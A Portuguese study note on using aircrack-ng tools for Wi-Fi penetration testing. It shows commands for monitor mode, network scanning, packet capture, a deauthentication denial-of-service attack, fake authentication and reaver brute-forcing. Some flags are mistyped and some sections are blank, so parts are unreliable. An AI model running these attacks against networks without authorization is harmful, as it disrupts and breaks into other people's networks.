Doc: https://www.aircrack-ng.org/
**Equipe Destinada:** [[Red Team]]

---
# Sobre

O pacote Aircrak é um ótimo conjunto de utilitários para testar uma rede wifi está devidamente segura, por meio de ferramentas capazes de quebrar senhas, capturar pacotes na rede, backdoor, etc.

## Usando as Ferramentas

#### **Criação de interface no modo monitor:**
``` bash
user@bash airmon-ng start {sua_interface};
```

#### **Retirando processos que podem usar a interface**
``` bash
user@bash airmon-ng check kill
```

#### **Varredura das redes próximas:**
``` bash
user@bash airodump-ng wlan0;
```

Com esse comando conseguimos as seguintes informações:

![[airodump_capture.png]]

**BSSID:** Identificador do dispositivo de rede wireless que é dado por meio do MAC.
PWR: Alcance da rede em relação ao computador.
Beacons:
Data:
CH: Canal de operação da rede.
MB:
ENC: Modo de encriptação usado para proteger a rede.
CIPHER:
AUTH: Apresenta se para acessar a rede é preciso de uma senha.
ESSID: Nome da rede.

Por meio deste comando apenas visualizamos as redes na frequência 2.4Ghz. Se quiser mudar para procurar por redes na frequência 5Ghz, use a flag *--band a* para especificar a banda 5g:

``` bash
user@bash airodump-ng --band a wlan0;
```

Há outras funcionalidades que *--band* oferece. Olhe pela flag *--help* ou pela documentação https://www.aircrack-ng.org/doku.php?id=airodump-ng .
#### **Verificando redes sem fio disponíveis:**
``` bash

```

#### **Capturando pacotes em uma rede:** 
``` bash
user@bash airodump-ng --bssdi {lanID} -- ch {int} --write {filename} wlan0
```

Informações coletadas:



#### Deauthentication:

DEAUTH é um tipo de ataque de negação de serviço (DoS) onde o alvo é desconectado de um AP e o atacante pode se passar pelo alvo, permanecendo na rede ou pode se passar pelo AP que conectava o alvo, funcionando como MiTM. 

*Veja mais em [[Denial Of Service (DDoS)]]*

A forma que usei precisa do endereço MAC do AP e do alvo

``` bash
aireplay-ng -O 1 -a {AP_MAC} -c {VICTIM_MAC} wlan0
```

#### Fake AUTH

Nesse ataque podemos usar com mais facilidade para quebrar a autenticação de redes do tipo WEP com maior facilidade. Para o caso de WPA/WPA2, somente o aireplay não será útil e recomendasse outra ferramenta ou uma combinação do aireplay com outra(s) ferramentas. 

``` bash
aireplay-ng -1 0 -a {AP_MAC} -h {interface_MAC} wlan0
```

#### WPA/WPA2 Cracking sem wordlist

Vou unir duas ferramentas diferentes e fazer chegar ao resultado que é conseguir a senha do roteador.

1. Usar um Fake AUTH ;
2. Usar o reaver para o bruteforce e encontrar a senha;

``` bash
aireplay-ng -1 0 -a {AP_MAC} -h {interface_MAC} wlan0
```

``` bash
reaver --bssid {AP_MAC} --channel 1 --interface wlan0 -vvv --no-associate
```

---
https://www.aircrack-ng.org/